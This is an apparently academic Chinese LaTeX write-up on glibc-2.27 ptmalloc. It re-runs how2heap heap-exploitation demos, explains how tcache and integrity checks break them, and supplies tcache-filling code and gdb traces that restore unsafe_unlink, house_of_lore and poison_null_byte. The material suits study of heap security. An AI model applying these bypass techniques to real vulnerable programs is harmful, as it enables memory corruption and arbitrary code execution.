@@ -1,0 +1,629 @@
+\begin{center}
+    \section{ptmalloc 分析}
+\end{center}
+
+\setlength{\parindent}{2em}
+此处分析的版本为glibc-2.27中的\verb+malloc+实现。
+
+下载glibc-2.27源码，并编译glibc，单独使用如下命令编译每个文件，将动态链接库替换为我们刚编译好的glibc-2.27:
+\begin{minted}[breaklines, frame=lines]{bash}
+$  how2heap git:(master) ✗ gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 unsafe_unlink.c -o unsafe 
+
+$  how2heap git:(master) ✗ ldd unsafe 
+    linux-vdso.so.1 =>  (0x00007fffa0a78000)
+    libc.so.6 => /root/tmpwork/g227/lib/libc.so.6 (0x00007f98aea71000)
+    /root/tmpwork/g227/lib/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f98aee26000)
+\end{minted}
+
+\subsection{unsafe\_unlink}
+依然使用之前的代码，只不过我们此次将glibc替换为glibc-2.27，此后的操作均相同：
+\begin{minted}[breaklines, frame=lines]{bash}
+$  how2heap git:(master) ✗ gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 unsafe_unlink.c -o unsafe_unlink
+
+$  how2heap git:(master) ✗ ldd unsafe_unlink 
+    linux-vdso.so.1 =>  (0x00007fff301e7000)
+    libc.so.6 => /root/tmpwork/g227/lib/libc.so.6 (0x00007f9d47544000)
+    /root/tmpwork/g227/lib/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f9d478f9000)
+
+$  how2heap git:(master) ✗ ./unsafe_unlink 
+The global chunk0_ptr is at 0x601070, pointing to 0x1641260
+The victim chunk we are going to corrupt is at 0x16412f0
+Fake chunk fd: 0x601058
+Fake chunk bk: 0x601060
+
+Original value: AAAAAAAA
+New Value: AAAAAAAA
+\end{minted}
+
+发现我们unsafe\_unlink攻击失效了。这是因为glibc-2.27添加了在unlink操作时候的检查，其中unlink操作的实现如下：
+\begin{minted}[breaklines, frame=lines]{c}
+#define unlink(AV, P, BK, FD) {                                                \
+    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))       \
+            malloc_printerr ("corrupted size vs. prev_size");                  \
+    FD = P->fd;                                                                \
+    BK = P->bk;                                                                \
+    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
+      malloc_printerr ("corrupted double-linked list");                        \
+    else {                                                                     \
+        FD->bk = BK;                                                           \
+        BK->fd = FD;                                                           \
+        if (!in_smallbin_range (chunksize_nomask (P))                          \
+            && __builtin_expect (P->fd_nextsize != NULL, 0)) {                 \
+        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)             \
+        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))             \
+          malloc_printerr ("corrupted double-linked list (not small)");        \
+            if (FD->fd_nextsize == NULL) {                                     \
+                if (P->fd_nextsize == P)                                       \
+                  FD->fd_nextsize = FD->bk_nextsize = FD;                      \
+                else {                                                         \
+                    FD->fd_nextsize = P->fd_nextsize;                          \
+                    FD->bk_nextsize = P->bk_nextsize;                          \
+                    P->fd_nextsize->bk_nextsize = FD;                          \
+                    P->bk_nextsize->fd_nextsize = FD;                          \
+                  }                                                            \
+              } else {                                                         \
+                P->fd_nextsize->bk_nextsize = P->bk_nextsize;                  \
+                P->bk_nextsize->fd_nextsize = P->fd_nextsize;                  \
+              }                                                                \
+          }                                                                    \
+      }                                                                        \
+}
+\end{minted}
+
+glibc-2.26引入了tcache机制，这是一种线程缓存机制，每个线程默认情况下有 64 个大小递增的 bins，每个 bin 是一个单链表，默认最多包含 7 个 chunk。其中缓存的 chunk 是不会被合并的，所以在释放 chunk 1 的时候，\verb+chunk0_ptr+ 仍然指向正确的堆地址，而不是之前的 \verb+chunk0_ptr = P = P->fd+。
+为了解决这个问题，一种可能的办法是给填充进特定大小的 chunk 把 bin 占满，就像下面这样：
+\begin{minted}[breaklines, frame=lines]{c}
+    int *a[10];
+    int i;
+    for (i = 0; i < 7; i++) {
+        a[i] = malloc(0x80);
+    }
+    for (i = 0; i < 7; i++) {
+        free(a[i]);
+    }
+\end{minted}
+
+程序中添加如上代码，运行：
+\begin{minted}[breaklines, frame=lines]{bash}
+$ ./unsafe_unlink
+The global chunk0_ptr is at 0x601070, pointing to 0x6aa260
+The victim chunk we are going to corrupt is at 0x6aa2f0
+
+Fake chunk fd: 0x601058
+Fake chunk bk: 0x601060
+
+Original value: AAAAAAAA
+New Value: BBBBBBBB
+\end{minted}
+利用成功，那么如果我们绕过glibc-2.27中的tcache，即unsafe\_unlink的漏洞仍然存在。
+
+\subsection{house\_of\_spirit}
+编译、运行，得到如下结果：
+\begin{minted}[breaklines, frame=lines]{bash}
+$  how2heap-g227 gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_spirit.c -o house_of_spirit
+
+$  how2heap-g227 ./house_of_spirit
+We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.
+The first one:  0x7ffda0ac1420
+The second one: 0x7ffda0ac1440
+Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffda0ac1420.
+Freeing the overwritten pointer.
+Now the next malloc will return the region of our fake chunk at 0x7ffda0ac1420, which will be 0x7ffda0ac1430!
+malloc(0x10): 0x7ffda0ac1430
+\end{minted}
+
+本攻击成功的原因是，我们已经控制了一个将被\verb+ free+的指针，且已经布置好了一个fastbin的\verb+ fake_chunk+的相关参数，接着在\verb+ free+操作时, 这个栈上的“堆块”即被投入 fastbin 中。
+下一次\verb+ malloc+对应的大小时, 由于 fastbin 的机制为先进后出, 故上次\verb+ free+的栈上的“堆块”能够被优先返回给用户。
+
+\subsection{house\_of\_lore}
+编译，运行得到如下结果，发现攻击不能正常进行：
+\begin{minted}[breaklines, frame=lines]{bash}
+$  how2heap-g227 gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_lore.c -o house_of_lore
+$  how2heap-g227 ./house_of_lore
+Allocated the victim (small) chunk: 0x621260
+stack_buffer_1: 0x7fff39008000
+stack_buffer_2: 0x7fff39007fe0
+
+Freeing the victim chunk 0x621260, it will be inserted in the unsorted bin
+victim->fd: (nil)
+victim->bk: 0x4141414141414141
+
+Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x621310
+The victim chunk 0x621260 will be inserted in front of the SmallBin
+victim->fd: (nil)
+victim->bk: 0x4141414141414141
+
+Now emulating a vulnerability that can overwrite the victim->bk pointer
+This last malloc should return a chunk at the position injected in bin->bk: 0x621260
+The fd pointer of stack_buffer_2 has changed: 0x7fff39008000
+\end{minted}
+
+攻击失效了，我们来看一下是什么原因使攻击失效。下面的代码是glibc2.27中使用\verb+ tcache+对smallbins的处理方式。
+
+\begin{minted}[breaklines, frame=lines]{c}
+    size_t tc_idx = csize2tidx (nb);
+    if (tcache && tc_idx < mp_.tcache_bins) {
+            mchunkptr tc_victim;
+            /* While bin not empty and tcache not full, copy chunks over.  */
+            while (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last (bin)) != bin) {
+          if (tc_victim != 0) {
+              bck = tc_victim->bk;
+              set_inuse_bit_at_offset (tc_victim, nb);
+              if (av != &main_arena)
+            set_non_main_arena (tc_victim);
+              bin->bk = bck;
+              bck->fd = bin;
+              tcache_put (tc_victim, tc_idx);
+                }
+        }
+        }
+\end{minted}
+
+从程序的运行结果上来看，\verb+ victim->bk: 0x4141414141414141+的原因成为了我们\verb+ memset()+至内存的字符串，其中一大可能的原因是\verb+ tcache+，源代码的第39行执行完毕后，我们可以在gdb的调试中印证这一点：
+\begin{minted}[breaklines, frame=lines]{bash}
+gef> x/20gx victim-0x2
+0x603250:   0x0000000000000000  0x0000000000000091 <--victim
+0x603260:   0x0000000000000000  0x4141414141414141 -
+...         0x4141414141414141  0x4141414141414141 | <-- 'A'*0x80
+0x6032d0:   0x4141414141414141  0x4141414141414141 -
+
+gef>  vmmap heap
+Start              End                Offset             Perm  Path
+0x0000000000603000 0x0000000000624000 0x0000000000000000 rw-   [heap]
+
+gef> x/20gx 0x0000000000603000+0x10                <- heap base+0x10
+0x603010:   0x0100000000000000  0x0000000000000000 <- tcache_01
+0x603020:   0x0000000000000000  0x0000000000000000
+0x603030:   0x0000000000000000  0x0000000000000000
+0x603040:   0x0000000000000000  0x0000000000000000
+0x603050:   0x0000000000000000  0x0000000000000000
+0x603060:   0x0000000000000000  0x0000000000000000
+0x603070:   0x0000000000000000  0x0000000000000000
+0x603080:   0x0000000000000000  0x0000000000603260 <- victim
+\end{minted}
+
+在前面已经提到，\verb+ tcache+的作用是为了更快速的unlink，因此unlink下来的堆块首先将被放置在\verb+ tcache+中。因此，我们的处理方式和之前一样，只需要在\verb+ malloc(0x80)+之后添加填满tcache的代码：
+\begin{minted}[breaklines, frame=lines]{c}
+    // fill the tcache
+    int *a[10];
+    for (int i = 0; i < 7; i++) {
+        a[i] = malloc(0x80);
+    }
+    for (i = 0; i < 7; i++) {
+        free(a[i]);
+    }
+\end{minted}
+
+并在再次\verb+ malloc(0x80)+之前清空掉\verb+ tcache+就可以了：
+\begin{minted}[breaklines, frame=lines]{c}
+    // empty the tcache
+    for (i = 0; i < 7; i++) {
+        a[i] = malloc(0x80);
+    }    
+\end{minted}
+
+接着编译后再运行，利用依然可以成功：
+\begin{minted}[breaklines, frame=lines]{bash}
+root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z took 7m 53s 
+$ gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_lore.c -o house_of_lore_tcache_b
+
+root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
+$ ./house_of_lore_tcache_b
+Allocated the victim (small) chunk: 0x230d260
+stack_buffer_1: 0x7ffeccacf810
+stack_buffer_2: 0x7ffeccacf830
+
+Freeing the victim chunk 0x230d260, it will be inserted in the unsorted bin
+victim->fd: 0x7f5adfe2fca0
+victim->bk: 0x7f5adfe2fca0
+
+Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x230d700
+The victim chunk 0x230d260 will be inserted in front of the SmallBin
+victim->fd: 0x7f5adfe2fd20
+victim->bk: 0x7f5adfe2fd20
+
+Now emulating a vulnerability that can overwrite the victim->bk pointer
+This last malloc should return a chunk at the position injected in bin->bk: 0x7ffeccacf820
+The fd pointer of stack_buffer_2 has changed: 0x7ffeccacf820
+
+Nice jump d00d
+\end{minted}
+
+\subsection{house\_of\_einherjar}
+
+编译后运行，\verb+ house_of_einherjar+完全不受影响：
+\begin{minted}[breaklines, frame=lines]{shell}
+$ ./house_of_einherjar 
+We allocate 0x10 bytes for 'a': 0x16b9260
+
+Our fake chunk at 0x7ffce41a2ae0 looks like:
+prev_size: 0x80
+size: 0x80
+fwd: 0x7ffce41a2ae0
+bck: 0x7ffce41a2ae0
+fwd_nextsize: 0x7ffce41a2ae0
+bck_nextsize: 0x7ffce41a2ae0
+
+We allocate 0xf8 bytes for 'b': 0x16b9280
+b.size: 0x101
+We overflow 'a' with a single null byte into the metadata of 'b'
+b.size: 0x100
+
+We write a fake prev_size to the last 8 bytes of a 
+so that it will consolidate with our fake chunk
+Our fake prev_size will be 0x16b9270 - 0x7ffce41a2ae0 = 0xffff80031d516790
+
+Modify fake chunk's size to reflect b's new prev_size
+Now we free b and this will consolidate with our fake chunk
+Our fake chunk size is now 0xffff80031d516790 (b.size + fake_prev_size)
+
+Now we can call malloc() and it will begin in our fake chunk: 0x16b9380
+\end{minted}
+
+\subsection{house\_of\_orange}
+
+编译，运行，结果报错：
+\begin{minted}[breaklines, frame=lines]{bash}
+root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
+$ gcc -g3 -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_orange.c -o house_of_orange      
+
+root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
+$ ./house_of_orange   
+house_of_orange: malloc.c:2401: sysmalloc: Assertion `(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)' failed.
+[1]    9705 abort      ./house_of_orange
+
+\end{minted}
+
+我们在报错信息中可以看到，是在malloc源代码中的第2401行看到：
+\begin{minted}[breaklines, frame=lines]{c}
+  assert ((old_top == initial_top (av) && old_size == 0) ||
+          ((unsigned long) (old_size) >= MINSIZE &&
+           prev_inuse (old_top) &&
+           ((unsigned long) old_end & (pagesize - 1)) == 0));
+\end{minted}
+
+我们在前面就已经提到过，house\_of\_orange是一种劫持\verb+ _IO_list_all+全局变量来伪造链表的利用技术，通过\verb+ _IO_flush_all_lockp()+函数触发。当glibc检测到内存错误的时候，会依次调用这样的函数路径：\verb+ malloc_printerr -> _libc_message -> abort -> _IO_flush_all_lockp+。
+\begin{minted}[breaklines, frame=lines]{c}
+// glibc-2.23 in libio/genops.c
+
+int
+_IO_flush_all_lockp (int do_lock)
+{
+  int result = 0;
+  struct _IO_FILE *fp;
+  int last_stamp;
+
+#ifdef _IO_MTSAFE_IO
+  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
+  if (do_lock)
+    _IO_lock_lock (list_all_lock);
+#endif
+
+  last_stamp = _IO_list_all_stamp;
+  fp = (_IO_FILE *) _IO_list_all;   // 将其覆盖为伪造的链表
+  while (fp != NULL)
+    {
+      run_fp = fp;
+      if (do_lock)
+    _IO_flockfile (fp);
+
+      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)   // 条件
+#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+        || (_IO_vtable_offset (fp) == 0
+          && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
+              > fp->_wide_data->_IO_write_base))
+#endif
+      )
+      && _IO_OVERFLOW (fp, EOF) == EOF)     // 将其修改为 system 函数
+    result = EOF;
+
+      if (do_lock)
+    _IO_funlockfile (fp);
+      run_fp = NULL;
+
+      if (last_stamp != _IO_list_all_stamp)
+    {
+      /* Something was added to the list.  Start all over again.  */
+      fp = (_IO_FILE *) _IO_list_all;
+      last_stamp = _IO_list_all_stamp;
+    }
+      else
+    fp = fp->_chain;    // 指向我们指定的区域
+    }
+
+#ifdef _IO_MTSAFE_IO
+  if (do_lock)
+    _IO_lock_unlock (list_all_lock);
+  __libc_cleanup_region_end (0);
+#endif
+
+  return result;
+}
+\end{minted}
+
+于是对\verb+ _IO_OVERFLOW(fp, EOF)+的调用会变成对\verb+ system('/bin/sh')+的调用。但是在glibc-2.24中\footnote{https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=commitdiff;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51}增加了对指针\verb+ vtable+的检查。
+所有的\verb+ libio vtables+被放进了专用的只读的\verb+ __libc_IO_vtables+段，以使它们在内存中连续。在任何间接跳转之前，\verb+ vtable+指针将根据段边界进行检查，如果指针不在这个段，则调用函数\verb+ _IO_vtable_check()+做进一步的检查，并且在必要时终止进程:
+\begin{minted}[breaklines, frame=lines]{c}
+// glibc-2.24 in libio/libioP.h
+/* Perform vtable pointer validation.  If validation fails, terminate
+   the process.  */
+static inline const struct _IO_jump_t *
+IO_validate_vtable (const struct _IO_jump_t *vtable)
+{
+  /* Fast path: The vtable pointer is within the __libc_IO_vtables
+     section.  */
+  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
+  const char *ptr = (const char *) vtable;
+  uintptr_t offset = ptr - __start___libc_IO_vtables;
+  if (__glibc_unlikely (offset >= section_length))
+    /* The vtable pointer is not in the expected section.  Use the
+       slow path, which will terminate the process if necessary.  */
+    _IO_vtable_check ();
+  return vtable;
+}
+
+// glibc-2.24 in libio/vtables.c
+void attribute_hidden
+_IO_vtable_check (void)
+{
+#ifdef SHARED
+  /* Honor the compatibility flag.  */
+  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
+#ifdef PTR_DEMANGLE
+  PTR_DEMANGLE (flag);
+#endif
+  if (flag == &_IO_vtable_check)
+    return;
+
+  /* In case this libc copy is in a non-default namespace, we always
+     need to accept foreign vtables because there is always a
+     possibility that FILE * objects are passed across the linking
+     boundary.  */
+  {
+    Dl_info di;
+    struct link_map *l;
+    if (_dl_open_hook != NULL
+        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
+            && l->l_ns != LM_ID_BASE))
+      return;
+  }
+
+#else /* !SHARED */
+  /* We cannot perform vtable validation in the static dlopen case
+     because FILE * handles might be passed back and forth across the
+     boundary.  Therefore, we disable checking in this case.  */
+  if (__dlopen != NULL)
+    return;
+#endif
+
+  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
+}
+\end{minted}
+
+\subsection{house\_of\_force}
+
+编译，运行：
+\begin{minted}[breaklines, frame=lines]{bash}
+root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z took 10s 
+$ gcc -g3 -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_force.c -o house_of_force
+
+root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
+$ ./house_of_force                                                                                                                                                 
+We will overwrite a variable at 0x601080
+
+Let's allocate the first chunk of 0x10 bytes: 0x1165260.
+Real size of our allocated chunk is 0x18.
+
+Overwriting the top chunk size with a big value so the malloc will never call mmap.
+Old size of top chunk: 0x20d91
+New size of top chunk: 0xffffffffffffffff
+
+The value we want to write to at 0x601080, and the top chunk is at 0x1165278, so accounting for the header size, we will malloc 0xffffffffff49bdf8 bytes.
+As expected, the new pointer is at the same place as the old top chunk: 0x1165280
+malloc(0x30) => 0x601080!
+
+Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.
+old string: This is a string that we want to overwrite.
+new string: YEAH!!!
+\end{minted}
+
+glibc-2.27不能防御house\_of\_force的利用。
+
+\subsection{poison\_null\_byte}
+
+编译，运行，不能攻击成功：
+\begin{minted}[breaklines, frame=lines]{bash}
+root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z took 7s 
+$ gcc -g3 -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 poison_null_byte.c -o poison_null_byte
+
+root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
+$ ./poison_null_byte         
+We allocate 0x10 bytes for 'a': 0x1149260
+'real' size of 'a': 0x18
+b: 0x1149280
+c: 0x1149390
+b.size: 0x111 ((0x100 + 0x10) | prev_in_use)
+
+After free(b), c.prev_size: 0
+We overflow 'a' with a single null byte into the metadata of 'b'
+b.size: 0x100
+
+Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))
+We malloc 'b1': 0x1149420
+c.prev_size: 0
+fake c.prev_size: 0x100
+
+We malloc 'b2', our 'victim' chunk: 0x11494b0
+Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
+Finally, we allocate 'd', overlapping 'b2': 0x1149500
+
+b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+New b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+\end{minted}
+
+我们在gdb中调试，在\verb+ free(b)+这条命令下断点，查看当前的堆分布：
+\begin{minted}[breaklines, frame=lines]{bash}
+gef> p b
+$1 = (uint8_t *) 0x603280 ""
+
+gef> vmmap heap
+Start              End                Offset             Perm Path
+0x0000000000603000 0x0000000000624000 0x0000000000000000 rw- [heap]
+
+gef> x/30gx 0x0000000000603000+0x10                   <-- heap base
+0x603010:   0x0000000000000000  0x0100000000000000    <-- tcache_1
+0x603020:   0x0000000000000000  0x0000000000000000
+...         ...                 ...
+0x6030b0:   0x0000000000000000  0x0000000000000000
+0x6030c0:   0x0000000000000000  0x0000000000603280    <-- address of b
+\end{minted}
+
+可以很明显的看到，glibc为了效率，没有将\verb+ free+后的b放置在\verb+  unsorted_bins+中。和之前的处理方式一样，我们只需要在\verb+ free+和\verb+ malloc+前后分别填满和置空tcache就可以了：
+\begin{minted}[breaklines, frame=lines]{c}
+    // deal with tcache, line 38
+    int *k[10], i;
+    for (i = 0; i < 7; i++) {
+        k[i] = malloc(0x100);
+    }
+    for (i = 0; i < 7; i++) {
+        free(k[i]);
+    }
+    free(b);
+    
+    // deal with tcache
+    for (i = 0; i < 7; i++) {
+        k[i] = malloc(0x80);
+    }
+    for (i = 0; i < 7; i++) {
+        free(k[i]);
+    }
+    free(b1);
+\end{minted}
+
+增加了填满tcache的代码后，重新编译后运行：
+\begin{minted}[breaklines, frame=lines]{bash}
+$ ./poison_null_byte_tcache
+We allocate 0x10 bytes for 'a': 0x1104260
+'real' size of 'a': 0x18
+b: 0x1104280
+c: 0x1104390
+b.size: 0x111 ((0x100 + 0x10) | prev_in_use)
+
+After free(b), c.prev_size: 0x110
+We overflow 'a' with a single null byte into the metadata of 'b'
+b.size: 0x100
+
+Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))
+We malloc 'b1': 0x1104280
+c.prev_size: 0x110
+fake c.prev_size: 0x70
+
+We malloc 'b2', our 'victim' chunk: 0x1104310
+Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
+Finally, we allocate 'd', overlapping 'b2': 0x1104280
+
+b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+\end{minted}
+
+利用成功。
+
+\subsection{unsorted\_bin\_attack}
+
+编译，运行得到结果：
+\begin{minted}[breaklines, frame=lines]{bash}
+$ ./unsorted_bin_attack    
+The target we want to rewrite on stack: 0x7ffd6553aaa0 -> 0
+
+Now, we allocate first small chunk on the heap at: 0x1093260
+We free the first chunk now. Its bk pointer point to (nil)
+We write it with the target address-0x10: 0x7ffd6553aa90
+
+Let's malloc again to get the chunk we just free: 0x7ffd6553aaa0 -> (nil)
+\end{minted}
+
+利用没有成功，我们在gdb中打开，在\verb+ free(p)+后下断，并查看当前堆布局：
+\begin{minted}[breaklines, frame=lines]{bash}
+gef> p p
+$1 = (unsigned long *) 0x602260
+
+gef> vmmap heap
+Start              End                Offset             Perm Path
+0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
+
+gef> x/30gx 0x0000000000602000+0x10                  <-- heap base
+0x602010:   0x0100000000000000  0x0000000000000000   <-- tcache_1
+0x602020:   0x0000000000000000  0x0000000000000000
+...         ...                 ...
+0x602070:   0x0000000000000000  0x0000000000000000
+0x602080:   0x0000000000000000  0x0000000000602260   <-- address of p
+
+\end{minted}
+
+发现还是tcache的影响，我们和之前的操作一样，只需要在\verb+ free+和\verb+ malloc+前后分别填满和置空tcache就可以了。但是，与之前的不同的是，从\verb+ unsorted bins+中取出chunks的时候，会先放置在tcache bins中，然后再从 tcache bin 中取出。
+那么问题就来了，在放进 tcache bin 的这个过程中，malloc 会以为我们的 target address 也是一个 chunk，然而这个 "chunk" 是过不了检查的，将抛出 "memory corruption" 的错误。如下方的处理逻辑：
+
+\begin{minted}[brraklines, frame=lines]{c}
+// in malloc.c, line 3788
+while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
+    {
+    bck = victim->bk;
+    if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
+        || __builtin_expect (chunksize_nomask (victim)
+	      > av->system_mem, 0))
+    malloc_printerr ("malloc(): memory corruption");
+\end{minted}
+
+那么要想跳过放 chunk 的这个过程，就需要对应 tcache bin 的 counts 域不小于 tcache\_count（默认为7），但如果 counts 不为 0，说明 tcache bin 里是有 chunk 的，那么 malloc 的时候会直接从 tcache bin 里取出，于是就没有 unsorted bin 什么事了：
+
+\begin{minted}[breaklines, frame=lines]{c}
+if (tc_idx < mp_.tcache_bins
+      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
+    && tcache
+    && tcache->entries[tc_idx] != NULL)
+    {
+      return tcache_get (tc_idx);
+    }
+\end{minted}
+
+这就造成了矛盾，所以我们需要找到一种既能从 unsorted bin 中取 chunk，又不会将 chunk 放进 tcache bin 的办法。这里用到的技术是，tcache poisoning\footnote{详见 http://tukan.farm/2017/07/08/tcache/}。
+将 counts 修改成了 \verb+ 0xff+，于是在进行到下面这里时就会进入 else 分支，直接取出 chunk 并返回：
+
+\begin{minted}[breaklines, frame=lines]{c}
+// in malloc.c, line 2938
+static void * tcache_get (size_t tc_idx) {
+  tcache_entry *e = tcache->entries[tc_idx];
+  assert (tc_idx < TCACHE_MAX_BINS);
+  assert (tcache->entries[tc_idx] > 0);
+  tcache->entries[tc_idx] = e->next;
+  /* integer overflow: 0x00 - 1 = 0xff 
+  make counts=0x00, then, it will be 0xff*/
+  --(tcache->counts[tc_idx]);  
+  return (void *) e;
+}
+
+// in malloc.c, line 3788
+#if USE_TCACHE
+          /* Fill cache first, return to user only if cache fills.
+         We may return one of these chunks later.  */
+          if (tcache_nb
+          && tcache->counts[tc_idx] < mp_.tcache_count)
+        {
+          tcache_put (victim, tc_idx);
+          return_cached = 1;
+          continue;
+        }
+          else
+        {
+#endif
+              check_malloced_chunk (av, victim, nb);
+              void *p = chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              return p;
+\end{minted}
+
+这里值得注意的是，\verb+ tcache_get()+函数内部不包含任何检查措施，也是我们利用成功的原因之一。
+
+
+
+\newpage
